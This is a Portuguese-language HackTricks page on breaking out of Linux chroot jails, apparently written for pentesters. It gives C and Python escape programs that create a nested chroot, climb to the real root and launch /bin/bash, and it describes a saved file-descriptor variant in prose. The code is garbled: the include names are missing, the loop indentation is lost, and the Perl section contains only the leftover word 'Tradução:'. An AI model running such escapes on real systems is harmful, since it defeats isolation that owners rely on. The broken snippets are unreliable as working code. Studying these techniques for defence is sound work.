# Escaping from Jails

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## **GTFOBins**

**Pesquise em** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se você pode executar algum binário com a propriedade "Shell"**

## Escapes de Chroot

Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): O mecanismo chroot **não é destinado a defender** contra manipulações intencionais por **usuários privilegiados** (**root**). Na maioria dos sistemas, os contextos chroot não se acumulam corretamente e programas chrooted **com privilégios suficientes podem realizar um segundo chroot para escapar**.\
Geralmente, isso significa que para escapar você precisa ser root dentro do chroot.

{% hint style="success" %}
A **ferramenta** [**chw00t**](https://github.com/earthquake/chw00t) foi criada para abusar dos seguintes cenários e escapar de `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Se você é **root** dentro de um chroot, você **pode escapar** criando **outro chroot**. Isso porque 2 chroots não podem coexistir (no Linux), então se você criar uma pasta e depois **criar um novo chroot** nessa nova pasta estando **fora dela**, você agora estará **fora do novo chroot** e, portanto, estará no FS.

Isso ocorre porque geralmente chroot NÃO move seu diretório de trabalho para o indicado, então você pode criar um chroot mas estar fora dele.
{% endhint %}

Geralmente você não encontrará o binário `chroot` dentro de um jail chroot, mas você **pode compilar, fazer upload e executar** um binário:

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("chroot-dir", 0755); chroot("chroot-dir"); for(int i = 0; i < 1000; i++) { chdir(".."); } chroot("."); system("/bin/bash"); }

````
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
````

</details>

<details>

<summary>Perl</summary>

Tradução:

#### Root + Saved fd

Isso é semelhante ao caso anterior, mas neste caso o **atacante armazena um descritor de arquivo para o diretório atual** e depois **cria o chroot em uma nova pasta**. Finalmente, como ele tem **acesso** a esse **FD** **fora** do chroot, ele acessa e **escapa**.

</details>
